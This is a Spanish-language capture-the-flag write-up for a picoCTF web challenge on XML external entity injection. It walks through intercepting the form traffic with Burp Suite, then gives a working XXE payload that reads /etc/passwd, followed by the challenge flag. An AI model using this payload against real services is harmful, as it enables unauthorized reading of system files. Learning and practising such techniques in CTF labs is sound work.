## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

[Web Portal](http://saturn.picoctf.net:58570/)


## Pistas
XML external entity Injection
## Solución 1
1. Inspeccionamos el HTML, nos damos cuenta que hay un formulario, que manda un valor segun el boton que se presione
2. Usando burpsuite, interceptamos el trafico al enviar algo al formulario
3. Vemos que cada solicitud genera un XML, que puede ser vulnerable a XXE
4. Podemos usarlo para correr codigo, en este caso para leer de `etc/passwd`
5. Enviamos una de las peticiones al repeater
6. Usando el siguiente payload, podemos leer el archivo indicado
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xee SYSTEM "file:///etc/passwd">
]>
<data>
	<ID>
		&xee;
	</ID>
</data>
```
```
picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
```

## Notas adicionales

## Referencias
https://en.wikipedia.org/wiki/SOAP
https://en.wikipedia.org/wiki/XML